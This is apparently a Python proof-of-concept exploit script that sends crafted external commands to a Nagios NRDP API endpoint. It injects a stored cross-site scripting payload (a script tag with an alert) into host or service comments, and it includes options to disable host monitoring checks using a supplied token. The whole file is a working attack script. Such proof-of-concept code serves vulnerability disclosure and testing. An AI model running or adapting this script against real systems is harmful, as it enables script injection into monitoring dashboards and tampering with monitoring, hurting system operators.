#!/usr/bin/python3

import requests
import sys


if not len(sys.argv) == 3:
    print(f'USAGE: {sys.argv[0]} TARGET_IP NRDP_TOKEN')
    exit(2)

target = sys.argv[1]
token = sys.argv[2]

command_dict = {
    'ACKNOWLEDGE_HOST_PROBLEM': 'ACKNOWLEDGE_HOST_PROBLEM;localhost;2;0;1;someuser;acknowledgement comment',
    'ADD_HOST_COMMENT': 'ADD_HOST_COMMENT;localhost;1;someuser;host comment',
    'ADD_SVC_COMMENT': 'ADD_SVC_COMMENT;localhost;HTTP;1;someuser;service comment',
    'DISABLE_HOST_CHECK': 'DISABLE_HOST_CHECK;localhost\n"',
    'ENABLE_HOST_CHECK': 'ENABLE_HOST_CHECK;localhost\n"',
}
# Only works if the host is down (though we could also send a message saying the host is down)
#command_type = 'ACKNOWLEDGE_HOST_PROBLEM'
command_type = 'ADD_HOST_COMMENT'  # Host must exist
#command_type = 'ADD_SVC_COMMENT'  # Service must exist (on the host specified)
#command_type = 'DISABLE_HOST_CHECK'  # Not XSS. Stops checks on specified host
#command_type = 'ENABLE_HOST_CHECK'  # Not XSS. Starts checks on specified host

external_command = command_dict[command_type]
xss_payload = f'<script>alert("NRDP API XSS via {command_type}")</script>'
command_string = f'{external_command}</td>{xss_payload}'

params = {
    'cmd': 'submitcmd',
    'token': token,
    'command': command_string,
}

url = f'http://{target}/nrdp/'
r = requests.get(url, params=params)
print(f'[*] Sent request: {r.request.method} {r.url}')

if r.status_code == 200:
    if '<message>OK</message>' in r.text:
        print('[+] Server responded OK')
    else:
        print(f'[!] Unexpected server response: {r.text}')
else:
    print(f'[!] Server responded with code {r.status_code}, response `{r.text}`')
